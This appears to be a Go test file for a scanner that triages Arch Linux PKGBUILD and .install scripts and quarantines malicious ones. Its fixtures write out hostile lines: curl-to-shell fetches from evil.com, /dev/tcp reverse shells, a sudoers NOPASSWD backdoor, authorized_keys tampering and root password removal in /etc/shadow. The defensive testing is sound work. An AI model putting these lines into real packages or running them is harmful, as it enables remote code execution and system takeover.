package pkgbuild

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/OnlyOneArthur/quarantine-daemon/internal/config"
)

func TestCleanStandardPKGBUILD(t *testing.T) {
	content := `
# Maintainer: Arch User <user@example.com>
pkgname=clean-app
pkgver=1.2.3
pkgrel=1
pkgdesc="A benign standard Arch Linux package"
arch=('x86_64')
url="https://github.com/example/clean-app"
license=('MIT')
source=("https://github.com/example/clean-app/archive/v1.2.3.tar.gz")
sha256sums=('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad')

build() {
    cd "$pkgname-$pkgver"
    make PREFIX=/usr
}

package() {
    cd "$pkgname-$pkgver"
    make DESTDIR="$pkgdir" install
}
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if res.Verdict != VerdictPass {
		t.Errorf("expected VerdictPass, got %s (score: %d)", res.Verdict, res.Score)
	}
	if res.Score != 0 {
		t.Errorf("expected score 0, got %d (triggers: %+v)", res.Score, res.Triggers)
	}
	if len(res.Triggers) != 0 {
		t.Errorf("expected 0 triggers, got %+v", res.Triggers)
	}
}

func TestCleanVCSPKGBUILD(t *testing.T) {
	content := `
pkgname=clean-tool-git
pkgver=1.0.0.r12.gabcdef1
pkgrel=1
pkgdesc="A benign VCS package using git"
arch=('x86_64')
url="https://gitlab.com/example/clean-tool"
license=('GPL3')
source=("git+https://gitlab.com/example/clean-tool.git#branch=main")
sha256sums=('SKIP')

pkgver() {
    cd clean-tool
    git describe --long --tags | sed 's/\([^-]*-g\)/r\1/;s/-/./g'
}

build() {
    cd clean-tool
    make
}

package() {
    cd clean-tool
    make DESTDIR="$pkgdir" install
}
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if !res.IsVCSPackage {
		t.Errorf("expected IsVCSPackage to be true")
	}
	if res.Verdict != VerdictPass {
		t.Errorf("expected VerdictPass, got %s (score: %d, triggers: %+v)", res.Verdict, res.Score, res.Triggers)
	}
	if res.Score != 0 {
		t.Errorf("expected score 0, got %d", res.Score)
	}

	hasVCSDampener := false
	for _, d := range res.DampenersApplied {
		if d == "vcs_package_dampener (exempt sha256sums=SKIP)" {
			hasVCSDampener = true
			break
		}
	}
	if !hasVCSDampener {
		t.Errorf("expected VCS dampener to be applied, got: %+v", res.DampenersApplied)
	}
}

func TestMaliciousRootScopeSourcingAttack(t *testing.T) {
	content := `
pkgname=malicious-root
pkgver=$(curl -s http://evil.com/x | sh)
pkgrel=1
arch=('x86_64')
source=()
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if res.Verdict != VerdictQuarantine {
		t.Errorf("expected VerdictQuarantine, got %s (score: %d)", res.Verdict, res.Score)
	}
	if res.Score < 85 {
		t.Errorf("expected score >= 85, got %d", res.Score)
	}

	hasRootScopeTrigger := false
	for _, tr := range res.Triggers {
		if tr.Scope == ScopeRoot && tr.Category == CategoryRemoteExecution {
			hasRootScopeTrigger = true
			break
		}
	}
	if !hasRootScopeTrigger {
		t.Errorf("expected root scope remote execution trigger, got: %+v", res.Triggers)
	}
}

func TestMaliciousFunctionPipe(t *testing.T) {
	content := `
pkgname=payload-fetcher
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
source=()

build() {
    curl evil.com/payload | bash
}

package() {
    install -Dm755 mytool "$pkgdir/usr/bin/mytool"
}
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if res.Verdict != VerdictQuarantine {
		t.Errorf("expected VerdictQuarantine, got %s (score: %d)", res.Verdict, res.Score)
	}
	if res.Score < 85 {
		t.Errorf("expected score >= 85, got %d", res.Score)
	}

	hasFuncPipeTrigger := false
	for _, tr := range res.Triggers {
		if tr.Scope == ScopeFunction && tr.Name == "pipe_network_to_shell" {
			hasFuncPipeTrigger = true
			break
		}
	}
	if !hasFuncPipeTrigger {
		t.Errorf("expected function-scope pipe_network_to_shell trigger, got: %+v", res.Triggers)
	}
}

func TestMaliciousPathTampering(t *testing.T) {
	testCases := []struct {
		name    string
		content string
	}{
		{
			name: "direct sudoers write",
			content: `
pkgname=tamper-sudoers
pkgver=1.0.0
package() {
    echo "evil ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
}
`,
		},
		{
			name: "direct authorized_keys tamper",
			content: `
pkgname=tamper-ssh
pkgver=1.0.0
package() {
    cp evil_id_rsa.pub ~/.ssh/authorized_keys
}
`,
		},
		{
			name: "direct shadow edit via sed",
			content: `
pkgname=tamper-shadow
pkgver=1.0.0
package() {
    sed -i 's/root:x:/root::/' /etc/shadow
}
`,
		},
	}

	cfg := config.DefaultConfig()
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			res, err := TriagePKGBUILD([]byte(tc.content), "/path/to/PKGBUILD", cfg)
			if err != nil {
				t.Fatalf("unexpected triage error: %v", err)
			}
			if res.Verdict != VerdictQuarantine {
				t.Errorf("expected VerdictQuarantine, got %s (score: %d)", res.Verdict, res.Score)
			}
			if res.Score < 85 {
				t.Errorf("expected score >= 85, got %d", res.Score)
			}

			hasPathTampering := false
			for _, tr := range res.Triggers {
				if tr.Category == CategoryPathTampering {
					hasPathTampering = true
					break
				}
			}
			if !hasPathTampering {
				t.Errorf("expected CategoryPathTampering trigger, got: %+v", res.Triggers)
			}
		})
	}
}

func TestLegitimatePackagingPath(t *testing.T) {
	content := `
pkgname=sudoers-helper
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
source=("https://github.com/example/sudoers-helper/archive/v1.0.0.tar.gz")
sha256sums=('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad')

package() {
    install -Dm644 file "$pkgdir/etc/sudoers.d/app"
    install -Dm755 binary "${pkgdir}/usr/bin/helper"
    install -Dm644 config "$srcdir/temp.conf"
}
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if res.Verdict != VerdictPass {
		t.Errorf("expected VerdictPass, got %s (score: %d, triggers: %+v)", res.Verdict, res.Score, res.Triggers)
	}
	if res.Score != 0 {
		t.Errorf("expected score 0, got %d", res.Score)
	}

	hasStagingDampener := false
	for _, d := range res.DampenersApplied {
		if d == "packaging_staging_dampener (path within packaging staging variables)" {
			hasStagingDampener = true
			break
		}
	}
	if !hasStagingDampener {
		t.Errorf("expected packaging_staging_dampener, got: %+v", res.DampenersApplied)
	}
}

func TestUntrustedSourceURL(t *testing.T) {
	testCases := []struct {
		name    string
		url     string
		isALERT bool
	}{
		{
			name:    "discord cdn link",
			url:     "https://cdn.discordapp.com/attachments/12345/67890/payload.tar.gz",
			isALERT: true,
		},
		{
			name:    "pastebin link",
			url:     "https://pastebin.com/raw/d8a3hd82",
			isALERT: true,
		},
		{
			name:    "raw ipv4 address",
			url:     "http://1.2.3.4/archive.tar.gz",
			isALERT: true,
		},
		{
			name:    "url shortener bitly",
			url:     "https://bit.ly/malicious-tarball",
			isALERT: true,
		},
	}

	cfg := config.DefaultConfig()
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			content := `
pkgname=untrusted-source-pkg
pkgver=1.0.0
source=("` + tc.url + `")
sha256sums=('SKIP')

build() {
    tar -xf *.tar.gz
}
`
			res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
			if err != nil {
				t.Fatalf("unexpected triage error: %v", err)
			}

			// Expected either ALERT or QUARANTINE
			if res.Verdict != VerdictAlert && res.Verdict != VerdictQuarantine {
				t.Errorf("expected ALERT or QUARANTINE, got %s (score: %d)", res.Verdict, res.Score)
			}
			if res.Score < 50 {
				t.Errorf("expected score >= 50, got %d", res.Score)
			}

			hasUntrustedSource := false
			for _, tr := range res.Triggers {
				if tr.Category == CategoryUntrustedSource {
					hasUntrustedSource = true
					break
				}
			}
			if !hasUntrustedSource {
				t.Errorf("expected CategoryUntrustedSource trigger, got: %+v", res.Triggers)
			}
		})
	}
}

func TestMaliciousInstallScriptlet(t *testing.T) {
	installContent := `
post_install() {
    echo "Installing background service..."
    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
}
`
	cfg := config.DefaultConfig()

	// Direct install scriptlet triage
	res, err := TriageInstallScript([]byte(installContent), "malicious.install", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if res.Verdict != VerdictQuarantine {
		t.Errorf("expected VerdictQuarantine, got %s (score: %d)", res.Verdict, res.Score)
	}
	if res.Score < 85 {
		t.Errorf("expected score >= 85, got %d", res.Score)
	}

	hasInstallScriptletScope := false
	for _, tr := range res.Triggers {
		if tr.Scope == ScopeInstallScriptlet {
			hasInstallScriptletScope = true
			break
		}
	}
	if !hasInstallScriptletScope {
		t.Errorf("expected trigger in ScopeInstallScriptlet, got: %+v", res.Triggers)
	}
}

func TestPKGBUILDWithAccompanyingInstallFile(t *testing.T) {
	tempDir := t.TempDir()
	pkgbuildPath := filepath.Join(tempDir, "PKGBUILD")
	installPath := filepath.Join(tempDir, "sample.install")

	installContent := `
post_install() {
    bash -i >& /dev/tcp/192.168.1.100/9001 0>&1
}
`
	if err := os.WriteFile(installPath, []byte(installContent), 0644); err != nil {
		t.Fatalf("failed to write install file: %v", err)
	}

	pkgbuildContent := `
pkgname=pkg-with-install
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
install=sample.install
source=()
`
	if err := os.WriteFile(pkgbuildPath, []byte(pkgbuildContent), 0644); err != nil {
		t.Fatalf("failed to write PKGBUILD: %v", err)
	}

	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(pkgbuildContent), pkgbuildPath, cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if res.Verdict != VerdictQuarantine {
		t.Errorf("expected VerdictQuarantine for PKGBUILD with malicious .install file, got %s (score: %d)", res.Verdict, res.Score)
	}
	if res.Score < 85 {
		t.Errorf("expected score >= 85, got %d", res.Score)
	}
}

func TestNonVCSChecksumSkipPenalty(t *testing.T) {
	content := `
pkgname=static-tool
pkgver=1.0.0
source=("https://example.com/tool.tar.gz")
sha256sums=('SKIP')
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	hasSkipTrigger := false
	for _, tr := range res.Triggers {
		if tr.Name == "non_vcs_skip_checksum" && tr.Category == CategoryIntegrity && tr.ScoreWeight == 15 {
			hasSkipTrigger = true
			break
		}
	}
	if !hasSkipTrigger {
		t.Errorf("expected non_vcs_skip_checksum integrity trigger (+15), got: %+v", res.Triggers)
	}
}

func TestSplitPackagesAndArrayVariables(t *testing.T) {
	content := `
pkgname=('split-pkg-a' 'split-pkg-b-git')
pkgver=2.0.0
source=("https://github.com/example/split/archive/v2.0.0.tar.gz")
sha256sums=('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad')

package_split-pkg-a() {
    install -Dm755 bin "$pkgdir/usr/bin/a"
}

package_split-pkg-b-git() {
    install -Dm755 bin "$pkgdir/usr/bin/b"
}
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if !res.IsVCSPackage {
		t.Errorf("expected IsVCSPackage true for split package with -git suffix")
	}
	if res.Verdict != VerdictPass {
		t.Errorf("expected VerdictPass, got %s", res.Verdict)
	}
}

func TestSyntaxError(t *testing.T) {
	content := `
pkgname=broken
pkgver=1.0.0
build() {
    if [ -f foo ]; then
`
	cfg := config.DefaultConfig()
	_, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err == nil {
		t.Errorf("expected syntax error for incomplete bash script")
	}
}
